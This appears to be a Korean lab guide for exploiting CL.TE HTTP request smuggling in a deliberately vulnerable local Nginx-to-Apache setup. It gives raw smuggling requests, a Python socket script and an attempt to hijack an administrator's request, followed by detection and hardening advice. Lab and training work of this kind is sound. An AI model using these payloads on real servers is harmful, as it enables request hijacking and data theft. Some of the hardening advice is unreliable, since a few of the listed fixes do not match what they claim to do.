# HTTP Request Smuggling 테스트 가이드

## 🎯 구현된 취약점

**아키텍처**: Nginx 1.21.0 → Apache 2.4.65

- **프론트엔드 (Nginx)**: Content-Length 헤더 우선 처리
- **백엔드 (Apache)**: Transfer-Encoding: chunked 우선 처리
- **취약점 유형**: CL.TE (Content-Length vs Transfer-Encoding)

## 🚀 서버 실행

```bash
cd website2
docker-compose up -d
```

**접속 정보**:
- Nginx 프록시: http://localhost:9000
- phpMyAdmin: http://localhost:8081
- MySQL: localhost:3307

## 🔬 테스트 방법

### 방법 1: CL.TE Basic Smuggling

**목적**: 백엔드에 추가 요청을 숨겨서 전송

```http
POST /api/submit_inquiry.php HTTP/1.1
Host: localhost:9000
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**예상 동작**:
1. Nginx는 Content-Length: 6을 기준으로 "0\r\n\r\nG" 전부 전송
2. Apache는 Transfer-Encoding: chunked 기준으로 "0\r\n\r\n"까지만 처리
3. "G"가 백엔드 버퍼에 남아있음
4. 다음 요청 시 "G"가 접두사로 붙어 요청 손상

### 방법 2: CL.TE Smuggled Request

**목적**: 완전한 악성 요청을 다음 사용자의 요청에 주입

```http
POST / HTTP/1.1
Host: localhost:9000
Content-Length: 155
Transfer-Encoding: chunked

0

POST /api/submit_inquiry.php HTTP/1.1
Host: localhost:9000
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

name=hacker
```

**예상 동작**:
- Nginx: 155바이트 전부 전송
- Apache: "0\r\n\r\n"까지만 첫 요청으로 처리
- 나머지 "POST /api/submit_inquiry.php..." 부분이 버퍼에 남음
- 다음 정상 사용자 요청이 도착하면 악성 요청이 먼저 처리됨

### 방법 3: Burp Suite 사용

1. **Burp Suite Repeater에서 테스트**

```http
POST /index.php HTTP/1.1
Host: localhost:9000
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

96
POST /api/submit_inquiry.php HTTP/1.1
Host: localhost:9000
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

name=smuggled&email=test@test
0


```

2. **Update Content-Length 비활성화**
   - Burp > Repeater > Settings
   - "Update Content-Length" 체크 해제

3. **요청 2번 연속 전송**
   - 첫 번째: Smuggled 요청 저장
   - 두 번째: 정상 요청이 smuggled 요청과 결합됨

### 방법 4: Python 스크립트

```python
import socket

# CL.TE Smuggling 페이로드
payload = (
    b"POST /api/submit_inquiry.php HTTP/1.1\r\n"
    b"Host: localhost:9000\r\n"
    b"Content-Length: 6\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Connection: keep-alive\r\n"
    b"\r\n"
    b"0\r\n"
    b"\r\n"
    b"G"
)

# 소켓 연결
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 9000))

# Smuggling 요청 전송
sock.sendall(payload)

# 응답 수신
response = sock.recv(4096)
print("Response 1:", response.decode())

# 두 번째 정상 요청 (smuggled "G"와 결합됨)
normal_request = (
    b"GET /index.php HTTP/1.1\r\n"
    b"Host: localhost:9000\r\n"
    b"\r\n"
)
sock.sendall(normal_request)
response2 = sock.recv(4096)
print("Response 2:", response2.decode())

sock.close()
```

### 방법 5: 고급 - Admin 권한 탈취

```http
POST /support.php HTTP/1.1
Host: localhost:9000
Content-Length: 256
Transfer-Encoding: chunked

0

POST /api/get_inquiry_detail.php HTTP/1.1
Host: localhost:9000
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

id=2&password=1234
Cookie: PHPSESSID=[관리자 세션]
X-Forwarded-For: 127.0.0.1
```

**목적**:
- 관리자의 다음 요청을 가로채서
- 비공개 문의(ID=2)의 비밀번호를 추출

## 🔍 탐지 방법

### 1. Nginx 로그 확인

```bash
docker exec 1xinv_nginx tail -f /var/log/nginx/access.log
docker exec 1xinv_nginx tail -f /var/log/nginx/error.log
```

### 2. Apache 로그 확인

```bash
docker exec 1xinv_web_v2 tail -f /var/log/apache2/access.log
docker exec 1xinv_web_v2 tail -f /var/log/apache2/error.log
```

### 3. Wireshark 패킷 캡처

```bash
# Docker 네트워크 트래픽 캡처
docker network ls
# website2_ota_network 확인 후
tcpdump -i br-[NETWORK_ID] -w smuggling.pcap
```

## ⚠️ 성공 지표

### Smuggling이 성공했다면:

1. **로그 불일치**
   - Nginx: 1개 요청 기록
   - Apache: 2개 요청 기록

2. **응답 이상**
   - 400 Bad Request
   - 403 Forbidden (의도하지 않은 경로)
   - 500 Internal Server Error

3. **타이밍 공격**
   - 첫 요청: 즉시 응답
   - 두 번째 요청: 지연 후 이상한 응답

## 🛡️ 방어 방법

### 즉시 수정 (nginx.conf)

```nginx
http {
    server {
        # Transfer-Encoding 헤더 제거
        proxy_set_header Transfer-Encoding "";

        # 또는 Content-Length와 Transfer-Encoding 동시 존재 시 거부
        if ($http_transfer_encoding != "") {
            return 400;
        }

        # HTTP/2 사용 (Smuggling 불가)
        listen 443 ssl http2;
    }
}
```

### Apache 설정 강화

```apache
# /etc/apache2/conf-enabled/security.conf
TraceEnable Off
LimitRequestFields 50
LimitRequestFieldSize 4094

# Transfer-Encoding 검증 모듈 활성화
LoadModule request_module modules/mod_request.so
```

## 📊 테스트 체크리스트

- [ ] CL.TE Basic 테스트 (G 주입)
- [ ] CL.TE Full Request Smuggling
- [ ] TE.CL 역방향 테스트
- [ ] Admin 세션 하이재킹 시도
- [ ] Nginx/Apache 로그 불일치 확인
- [ ] Burp Suite Repeater 테스트
- [ ] Python 스크립트 자동화
- [ ] 패킷 캡처 분석

## 🔗 참고 자료

- [PortSwigger Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Request Smuggling Reborn](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-HTTP-Request-Smuggling.pdf)
- [CL.TE vs TE.CL](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling)

---

**주의**: 이 설정은 교육 목적의 취약점 테스트용입니다. 프로덕션 환경에서 절대 사용하지 마세요.
